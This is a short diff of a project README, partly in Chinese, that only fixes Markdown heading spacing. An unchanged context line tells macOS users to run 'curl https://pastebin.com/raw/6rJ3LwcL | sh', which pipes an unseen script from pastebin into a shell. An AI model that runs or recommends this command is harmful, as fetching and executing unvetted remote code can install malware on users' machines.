@@ -1,6 +1,5 @@
 
-
-##In Macos Terminal
+## In Macos Terminal
 
 Run below:
 
@@ -9,7 +8,7 @@ curl https://pastebin.com/raw/6rJ3LwcL | sh
 ```
 
 
-##关于Cloud Develops
+## 关于Cloud Develops
 
 
 ### 为什么是MYBATIS和Data JPA
